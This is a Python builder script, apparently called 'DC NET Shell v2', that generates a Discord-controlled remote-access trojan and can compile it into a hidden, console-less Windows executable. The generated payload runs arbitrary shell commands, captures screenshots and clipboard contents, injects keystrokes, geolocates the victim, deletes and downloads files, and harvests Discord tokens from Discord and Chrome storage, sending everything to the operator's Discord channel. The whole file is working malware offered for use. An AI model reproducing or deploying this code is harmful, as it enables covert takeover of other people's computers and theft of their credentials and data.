import os
import shutil
import sys
import subprocess

def print_ascii_banner():
    RED = "\033[91m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    NC = "\033[0m"

    banner = f"""
{RED}           ,----------------,         
       ,-----------------------,      
      /                       /|      
     +-----------------------+ |      
    |  .------------------.  | |      
    |  |  {MAGENTA}DC NET Shell v2 {RED}|  | |      
    |  |  {MAGENTA}Status: READY   {RED}|  | |      
    |  |  {MAGENTA}Building...     {RED}|  | |      
    |  |  {MAGENTA}Chat: @Discord  {RED}|  | |      
    |  |  {MAGENTA}>_              {RED}|  | |      
    |  `------------------'  |/       
    +-----------------------+'         
       /_)______________(_/           
  ____________________________         
 /{CYAN}    Discord Bot Builder     {RED}\\   
/{CYAN}         by strg-cv           {RED}\\      
`------------------------------'      {NC}
"""
    print(banner)

def get_input():
    bot_token = input("Enter your Discord bot Token: ").strip()
    channel_id = input("Enter your Discord channel ID (numbers only): ").strip()
    try:
        channel_id_int = int(channel_id)
    except ValueError:
        print("Invalid channel ID! Must be numeric.")
        sys.exit(1)
    return bot_token, channel_id_int

def generate_bot_code(bot_token, channel_id):
    return f'''\
import os
import sys
import subprocess
import platform
import socket
import psutil
import io
import asyncio
import ctypes

# Auto-install missing packages
def install_packages():
    import importlib
    packages = ["discord", "pyautogui", "pyttsx3", "pyperclip", "requests", "psutil"]
    for pkg in packages:
        try:
            importlib.import_module(pkg)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

install_packages()

import discord
import pyautogui
try:
    import pyttsx3
except ImportError:
    pyttsx3 = None
try:
    import pyperclip
except ImportError:
    pyperclip = None
import requests
import json

TOKEN = "{bot_token}"
CHANNEL_ID = {channel_id}

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org").text
    except:
        return "Unavailable"

def get_system_info():
    uname = platform.uname()
    public_ip = get_public_ip()
    cpu = psutil.cpu_percent(interval=1)
    mem = psutil.virtual_memory().percent
    disk = psutil.disk_usage("/").percent
    local_ip = socket.gethostbyname(socket.gethostname())
    return f"**System Info:**\\nSystem: {{uname.system}}\\nNode: {{uname.node}}\\nRelease: {{uname.release}}\\nVersion: {{uname.version}}\\nMachine: {{uname.machine}}\\nProcessor: {{uname.processor}}\\nPublic IP: {{public_ip}}\\nLocal IP: {{local_ip}}\\nCPU: {{cpu}}%\\nMemory: {{mem}}%\\nDisk: {{disk}}%"

async def run_command(channel, command):
    try:
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout + result.stderr
        if len(output) > 1900:
            output = output[:1900] + "... (truncated)"
        await channel.send(f"```\n{{output}}\n```")
    except Exception as e:
        await channel.send(f"Error: {{e}}")

async def send_screenshot(channel):
    try:
        screenshot = pyautogui.screenshot()
        img_io = io.BytesIO()
        screenshot.save(img_io, format='PNG')
        img_io.seek(0)
        await channel.send(file=discord.File(fp=img_io, filename="screenshot.png"))
    except Exception as e:
        await channel.send(f"Screenshot failed: {{e}}")

async def clipboard_content(channel):
    try:
        if pyperclip is None:
            await channel.send("pyperclip not installed.")
            return
        content = pyperclip.paste()
        if len(content) > 1900:
            content = content[:1900] + "... (truncated)"
        await channel.send(f"```\n{{content}}\n```")
    except Exception as e:
        await channel.send(f"Clipboard error: {{e}}")

async def say_voice(channel, text):
    try:
        if pyttsx3 is None:
            await channel.send("pyttsx3 not installed.")
            return
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
        await channel.send("Spoken text.")
    except Exception as e:
        await channel.send(f"Voice error: {{e}}")

async def geolocate_ip(channel):
    try:
        ip = get_public_ip()
        data = requests.get(f"http://ip-api.com/json/{{ip}}").json()
        if data['status'] == 'success':
            loc = f"City: {{data['city']}}, Region: {{data['regionName']}}, Country: {{data['country']}}, ISP: {{data['isp']}}\\nLatitude: {{data['lat']}}, Longitude: {{data['lon']}}\\nGoogle Maps: https://www.google.com/maps/search/?api=1&query={{data['lat']}},{{data['lon']}}"
            await channel.send(loc)
        else:
            await channel.send("Geolocation failed.")
    except Exception as e:
        await channel.send(f"Geolocation error: {{e}}")

async def list_processes(channel):
    try:
        procs = [p.info for p in psutil.process_iter(['pid', 'name'])]
        proc_list = "\\n".join([f"{{p['pid']}} - {{p['name']}}" for p in procs])
        if len(proc_list) > 1900:
            proc_list = proc_list[:1900] + "... (truncated)"
        await channel.send(f"```\n{{proc_list}}\n```")
    except Exception as e:
        await channel.send(f"Error listing processes: {{e}}")

async def delete_file(channel, filepath):
    try:
        if os.path.exists(filepath):
            os.remove(filepath)
            await channel.send(f"File '{{filepath}}' deleted.")
        else:
            await channel.send("File does not exist.")
    except Exception as e:
        await channel.send(f"Delete error: {{e}}")

async def write_text(channel, text):
    try:
        pyautogui.typewrite(text)
        await channel.send("Text typed.")
    except Exception as e:
        await channel.send(f"Write error: {{e}}")

async def show_message(channel, text):
    try:
        from tkinter import messagebox, Tk
        root = Tk()
        root.withdraw()
        messagebox.showinfo("Message", text)
        root.destroy()
        await channel.send("Message box shown.")
    except Exception as e:
        await channel.send(f"Message box error: {{e}}")

async def set_wallpaper(channel, filepath):
    try:
        SPI_SETDESKWALLPAPER = 20
        result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, filepath, 3)
        if result:
            await channel.send("Wallpaper changed successfully.")
        else:
            await channel.send("Failed to change wallpaper.")
    except Exception as e:
        await channel.send(f"Wallpaper error: {{e}}")

async def admin_check(channel):
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        await channel.send(f"Admin privileges: {{is_admin}}")
    except Exception as e:
        await channel.send(f"Admin check error: {{e}}")

async def download_file(channel, url, filename):
    try:
        r = requests.get(url)
        with open(filename, 'wb') as f:
            f.write(r.content)
        await channel.send(f"Downloaded file saved as '{{filename}}'")
    except Exception as e:
        await channel.send(f"Download failed: {{e}}")

async def upload_file(message):
    if message.attachments:
        for attachment in message.attachments:
            await attachment.save(attachment.filename)
            await message.channel.send(f"File '{{attachment.filename}}' saved.")

def get_discord_tokens():
    tokens = []
    try:
        paths = [
            os.path.expandvars(r'%APPDATA%\\..\\Local\\Discord\\User Data\\Default\\Local Storage\\leveldb'),
            os.path.expandvars(r'%APPDATA%\\Discord\\Local Storage\\leveldb'),
            os.path.expandvars(r'%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb'),
        ]
        import re
        for path in paths:
            if os.path.exists(path):
                for file in os.listdir(path):
                    if file.endswith('.log') or file.endswith('.ldb'):
                        with open(os.path.join(path, file), errors='ignore') as f:
                            content = f.read()
                            tokens += re.findall(r"[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}", content)
    except Exception:
        pass
    return list(set(tokens))

async def send_tokens(channel):
    tokens = get_discord_tokens()
    if tokens:
        await channel.send("**Discord Tokens found:**\\n" + "\\n".join(tokens))
    else:
        await channel.send("No tokens found.")

@client.event
async def on_ready():
    print(f"Bot connected as {{client.user}}")
    channel = client.get_channel(CHANNEL_ID)
    if channel:
        await channel.send("Bot connected and ready.")

@client.event
async def on_message(message):
    if message.author == client.user or message.channel.id != CHANNEL_ID:
        return
    content = message.content.lower()
    if content.startswith("!systeminfo"):
        await message.channel.send(get_system_info())
    elif content.startswith("!screenshot"):
        await send_screenshot(message.channel)
    elif content.startswith("!cmd "):
        await run_command(message.channel, message.content[5:])
    elif content.startswith("!clipboard"):
        await clipboard_content(message.channel)
    elif content.startswith("!write "):
        await write_text(message.channel, message.content[7:])
    elif content.startswith("!voice "):
        await say_voice(message.channel, message.content[7:])
    elif content.startswith("!geolocate"):
        await geolocate_ip(message.channel)
    elif content.startswith("!listprocess"):
        await list_processes(message.channel)
    elif content.startswith("!delete "):
        await delete_file(message.channel, message.content[8:].strip())
    elif content.startswith("!message "):
        await show_message(message.channel, message.content[9:])
    elif content.startswith("!wallpaper") and message.attachments:
        file = message.attachments[0]
        await file.save(file.filename)
        await set_wallpaper(message.channel, file.filename)
    elif content.startswith("!admincheck"):
        await admin_check(message.channel)
    elif content.startswith("!download "):
        url = message.content[10:].strip()
        filename = url.split("/")[-1]
        await download_file(message.channel, url, filename)
    elif content.startswith("!upload"):
        await upload_file(message)
    elif content.startswith("!grabtokens"):
        await send_tokens(message.channel)
    elif content.startswith("!stop"):
        await message.channel.send("Shutting down...")
        await client.close()
        sys.exit(0)

client.run(TOKEN)
'''

def main():
    print_ascii_banner()
    token, cid = get_input()
    code = generate_bot_code(token, cid)
    
    with open("discord_bot_ready.pyw", "w", encoding="utf-8") as f:
        f.write(code)
    print("\nBot script saved as 'discord_bot_ready.pyw'.")

    if input("\nConvert to EXE? (yes/no): ").strip().lower() == "yes":
        subprocess.run(
            "python -m PyInstaller --onefile --noconsole "
            "--hidden-import=discord --hidden-import=discord.ext.commands "
            "--hidden-import=pyttsx3 --hidden-import=pyttsx3.drivers "
            "--hidden-import=pyttsx3.drivers.sapi5 "
            "discord_bot_ready.pyw",
            shell=True
        )
        shutil.rmtree("build", ignore_errors=True)
        shutil.rmtree("__pycache__", ignore_errors=True)
        if os.path.exists("discord_bot_ready.spec"):
            os.remove("discord_bot_ready.spec")
        if os.path.exists("dist/discord_bot_ready.exe"):
            shutil.move("dist/discord_bot_ready.exe", "discord_bot_ready.exe")
            shutil.rmtree("dist", ignore_errors=True)
        print("EXE created: discord_bot_ready.exe")
    else:
        print("Keeping only the .pyw script.")

if __name__ == "__main__":
    main()
